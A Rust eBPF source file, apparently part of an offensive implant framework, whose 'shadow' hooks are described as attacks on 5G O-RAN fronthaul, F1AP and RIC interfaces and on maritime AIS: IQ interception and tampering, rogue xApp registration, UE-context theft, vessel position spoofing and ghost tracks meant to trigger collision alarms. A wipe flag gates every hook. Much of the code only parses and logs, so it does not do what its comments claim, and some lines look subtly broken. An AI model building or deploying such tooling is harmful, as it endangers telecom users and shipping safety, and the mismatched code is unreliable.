use aya_ebpf::{
    bindings::xdp_action,
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::{classifier, kprobe, xdp},
    programs::{ProbeContext, TcContext, XdpContext},
};
use common::{
    AisVesselState, EcpriFronthaulState, EventHeader, OranRicState, EVENT_AIS_CPA_ABUSE,
    EVENT_AIS_POSITION_SPOOF, EVENT_ECPRI_IQ_INTERCEPT, EVENT_F1AP_CU_DU_EXPLOIT,
    EVENT_FRONTHAUL_MITM_INJECT, EVENT_ORAN_XAPP_EXPLOIT,
};

use crate::maps::*;

const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;
const UDP_HDR_LEN: usize = 8;
const SCTP_HDR_LEN: usize = 12;

const ECPRI_ETHERTYPE: u16 = 0xAEFE; // eCPRI EtherType on fronthaul Ethernet
const ECPRI_PROTO_VER: u8 = 0x10; // protocol revision 1.0 in the high nibble
const ECPRI_MSG_IQ: u8 = 0x00; // eCPRI message type: IQ data plane
const ECPRI_IQ_BIAS: u32 = 0x0100; // magnitude bias applied to tampered IQ
const E2AP_SUBSCRIPTION_TAG: u8 = 0xC1; // E2AP subscription request tag (RIC)
const F1AP_PORT: u16 = 38472; // F1-C SCTP port between O-CU and O-DU
const F1AP_INITIATING_MSG: u8 = 0x10; // F1AP initiating message marker
const AIS_FRAMING_FLAG: u8 = 0x7E; // HDLC flag framing GMSK AIS bursts

// ──────────────────────────────────────────────
// FEATURE 167: eCPRI IQ Sample Intercept
// Captures raw unencrypted IQ samples between O-RU and O-DU
// ──────────────────────────────────────────────

#[xdp]
pub fn shadow_ecpri_iq_intercept(ctx: XdpContext) -> u32 {
    try_ecpri_iq_intercept(&ctx).unwrap_or(xdp_action::XDP_PASS)
}

fn try_ecpri_iq_intercept(ctx: &XdpContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(xdp_action::XDP_PASS);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    // raw Ethernet + 10-byte eCPRI common header + one IQ pair
    if data + ETH_HDR_LEN + 14 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let ethertype = unsafe { u16::from_be(*((data + 12) as *const u16)) };
    if ethertype == ECPRI_ETHERTYPE {
        let ecpri_hdr = data + ETH_HDR_LEN;
        let ver = unsafe { *(ecpri_hdr as *const u8) };

        if ver & 0xF0 == ECPRI_PROTO_VER {
            let msg_type = unsafe { *((ecpri_hdr + 1) as *const u8) };
            let pc_id = unsafe { u16::from_be(*((ecpri_hdr + 4) as *const u16)) };
            let seq_id = unsafe { u32::from_be(*((ecpri_hdr + 6) as *const u32)) };
            // IQ data is unencrypted per O-RAN WG4 — peak magnitude follows
            let iq_amplitude = unsafe { u32::from_be(*((ecpri_hdr + 10) as *const u32)) };

            let state = EcpriFronthaulState {
                seq_num: seq_id,
                pc_id,
                msg_type,
                _pad: 0,
                iq_amplitude,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
            };
            let _ = ECPRI_FRONTHAUL_STATE.insert(&(pc_id as u32), &state, 0);

            let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
            let event = EventHeader {
                event_type: EVENT_ECPRI_IQ_INTERCEPT,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: ((pc_id as u64) << 32) | iq_amplitude as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(xdp_action::XDP_PASS)
}

// ──────────────────────────────────────────────
// FEATURE 168: Fronthaul MitM Injection
// Biases IQ samples in transit to tamper with beamforming weights
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_fronthaul_mitm_inject(ctx: TcContext) -> i32 {
    try_fronthaul_mitm_inject(&ctx).unwrap_or(0)
}

fn try_fronthaul_mitm_inject(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    if data + ETH_HDR_LEN + 14 > data_end {
        return Ok(0);
    }

    let ethertype = unsafe { u16::from_be(*((data + 12) as *const u16)) };
    if ethertype == ECPRI_ETHERTYPE {
        let ecpri_hdr = data + ETH_HDR_LEN;
        let ver = unsafe { *(ecpri_hdr as *const u8) };

        if ver & 0xF0 == ECPRI_PROTO_VER {
            let msg_type = unsafe { *((ecpri_hdr + 1) as *const u8) };

            // tamper only with the user-plane IQ data flow
            if msg_type == ECPRI_MSG_IQ {
                let pc_id = unsafe { u16::from_be(*((ecpri_hdr + 4) as *const u16)) };
                let seq_id = unsafe { u32::from_be(*((ecpri_hdr + 6) as *const u32)) };
                let iq_amplitude = unsafe { u32::from_be(*((ecpri_hdr + 10) as *const u32)) };

                // shift the magnitude in transit — skews beamforming weights
                // and can null resource blocks targeting individual UEs
                let tampered = iq_amplitude.wrapping_add(ECPRI_IQ_BIAS);

                let state = EcpriFronthaulState {
                    seq_num: seq_id,
                    pc_id,
                    msg_type,
                    _pad: 0,
                    iq_amplitude: tampered,
                    timestamp_ns: unsafe { bpf_ktime_get_ns() },
                };
                let _ = ECPRI_FRONTHAUL_STATE.insert(&(pc_id as u32), &state, 0);

                let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
                let event = EventHeader {
                    event_type: EVENT_FRONTHAUL_MITM_INJECT,
                    pid,
                    timestamp_ns: unsafe { bpf_ktime_get_ns() },
                    context: ((pc_id as u64) << 32) | tampered as u64,
                };
                let _ = EVENTS.output(&event, 0);
            }
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 169: O-RAN xApp Exploitation
// Registers rogue xApps and injects false RAN metrics via the E2 interface
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_oran_xapp_exploit(ctx: ProbeContext) -> u32 {
    try_oran_xapp_exploit(&ctx).unwrap_or(0)
}

fn try_oran_xapp_exploit(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let len: usize = ctx.arg::<usize>(2).ok_or(0i64)?;

    if len < 16 {
        return Ok(0);
    }

    let hdr: [u8; 16] =
        unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 16])? };

    // E2AP subscription request toward the Near-RT RIC: rogue xApp
    // registration followed by injected metrics / policy manipulation
    if hdr[0] == E2AP_SUBSCRIPTION_TAG {
        let xapp_id = u32::from_be_bytes([hdr[1], hdr[2], hdr[3], hdr[4]]);
        let e2_node_id = u32::from_be_bytes([hdr[5], hdr[6], hdr[7], hdr[8]]);
        let subscription_hash = u32::from_be_bytes([hdr[9], hdr[10], hdr[11], hdr[12]]);
        let policy_id = u32::from_be_bytes([hdr[13], hdr[14], hdr[15], hdr[4]]);

        let state = OranRicState {
            xapp_id,
            e2_node_id,
            subscription_hash,
            policy_id,
            _pad: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = ORAN_RIC_STATE.insert(&xapp_id, &state, 0);

        let event = EventHeader {
            event_type: EVENT_ORAN_XAPP_EXPLOIT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((xapp_id as u64) << 32) | subscription_hash as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 170: CU/DU Split Exploitation
// Manipulates F1AP procedures to steal UE context between O-CU and O-DU
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_f1ap_cu_du_exploit(ctx: TcContext) -> i32 {
    try_f1ap_cu_du_exploit(&ctx).unwrap_or(0)
}

fn try_f1ap_cu_du_exploit(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    if data + ETH_HDR_LEN + IP_HDR_LEN + SCTP_HDR_LEN + 8 > data_end {
        return Ok(0);
    }

    // F1-C runs over SCTP between O-CU and O-DU
    let l4_hdr = data + ETH_HDR_LEN + IP_HDR_LEN;
    let src_port = unsafe { u16::from_be(*(l4_hdr as *const u16)) };
    let dst_port = unsafe { u16::from_be(*((l4_hdr + 2) as *const u16)) };

    if src_port == F1AP_PORT || dst_port == F1AP_PORT {
        let payload = l4_hdr + SCTP_HDR_LEN;
        let tag = unsafe { *(payload as *const u8) };

        // F1AP initiating message: procedure code steals UE context
        if tag == F1AP_INITIATING_MSG {
            let proc_code = unsafe { *((payload + 1) as *const u8) };
            let gnb_du_id = unsafe { u32::from_be(*((payload + 4) as *const u32)) };

            let state = OranRicState {
                xapp_id: 0,
                e2_node_id: gnb_du_id,
                subscription_hash: 0,
                policy_id: proc_code as u32,
                _pad: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
            };
            let _ = ORAN_RIC_STATE.insert(&gnb_du_id, &state, 0);

            let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
            let event = EventHeader {
                event_type: EVENT_F1AP_CU_DU_EXPLOIT,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: ((proc_code as u64) << 32) | gnb_du_id as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 171: AIS Position Spoofing
// Transmits GMSK AIS messages with spoofed MMSI and phantom positions
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_ais_position_spoof(ctx: TcContext) -> i32 {
    try_ais_position_spoof(&ctx).unwrap_or(0)
}

fn try_ais_position_spoof(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    if data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 18 > data_end {
        return Ok(0);
    }

    let payload_offset = ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN;
    let flag_byte = unsafe { *((data + payload_offset) as *const u8) };

    if flag_byte == AIS_FRAMING_FLAG {
        // HDLC-framed AIS: message type, MMSI, position, SOG/COG
        let msg_type = unsafe { *((data + payload_offset + 1) as *const u8) } & 0x3F;
        let mmsi = u32::from_be_bytes([
            unsafe { *((data + payload_offset + 2) as *const u8) },
            unsafe { *((data + payload_offset + 3) as *const u8) },
            unsafe { *((data + payload_offset + 4) as *const u8) },
            unsafe { *((data + payload_offset + 5) as *const u8) },
        ]) >> 2; // 30-bit MMSI
        let lat_deg = i32::from_be_bytes([
            unsafe { *((data + payload_offset + 6) as *const u8) },
            unsafe { *((data + payload_offset + 7) as *const u8) },
            unsafe { *((data + payload_offset + 8) as *const u8) },
            unsafe { *((data + payload_offset + 9) as *const u8) },
        ]);
        let lon_deg = i32::from_be_bytes([
            unsafe { *((data + payload_offset + 10) as *const u8) },
            unsafe { *((data + payload_offset + 11) as *const u8) },
            unsafe { *((data + payload_offset + 12) as *const u8) },
            unsafe { *((data + payload_offset + 13) as *const u8) },
        ]);
        let sog_tenths = u16::from_be_bytes([
            unsafe { *((data + payload_offset + 14) as *const u8) },
            unsafe { *((data + payload_offset + 15) as *const u8) },
        ]);
        let cog_tenths = u16::from_be_bytes([
            unsafe { *((data + payload_offset + 16) as *const u8) },
            unsafe { *((data + payload_offset + 17) as *const u8) },
        ]);

        let state = AisVesselState {
            mmsi,
            lat_deg,
            lon_deg,
            sog_tenths,
            cog_tenths,
            msg_type,
            _pad: [0; 3],
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = AIS_VESSEL_STATE.insert(&mmsi, &state, 0);

        let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
        let event = EventHeader {
            event_type: EVENT_AIS_POSITION_SPOOF,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((mmsi as u64) << 8) | msg_type as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 172: AIS Collision Avoidance Abuse
// Injects ghost vessel tracks engineered to trip CPA/TCPA alarms
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_ais_cpa_abuse(ctx: ProbeContext) -> u32 {
    try_ais_cpa_abuse(&ctx).unwrap_or(0)
}

fn try_ais_cpa_abuse(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 18] =
        unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 18])? };

    if hdr[0] == AIS_FRAMING_FLAG {
        // ghost track: intercept course computed to minimize CPA and
        // force TCPA alarms, diverting shipping lanes or closing ports
        let mmsi = u32::from_be_bytes([hdr[1], hdr[2], hdr[3], hdr[4]]) >> 2;
        let lat_deg = i32::from_be_bytes([hdr[5], hdr[6], hdr[7], hdr[8]]);
        let lon_deg = i32::from_be_bytes([hdr[9], hdr[10], hdr[11], hdr[12]]);
        let sog_tenths = u16::from_be_bytes([hdr[13], hdr[14]]);
        let cog_tenths = u16::from_be_bytes([hdr[15], hdr[16]]);
        let msg_type = hdr[17] & 0x3F;

        let state = AisVesselState {
            mmsi,
            lat_deg,
            lon_deg,
            sog_tenths,
            cog_tenths,
            msg_type,
            _pad: [0; 3],
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = AIS_VESSEL_STATE.insert(&mmsi, &state, 0);

        let event = EventHeader {
            event_type: EVENT_AIS_CPA_ABUSE,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((mmsi as u64) << 20) | sog_tenths as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}
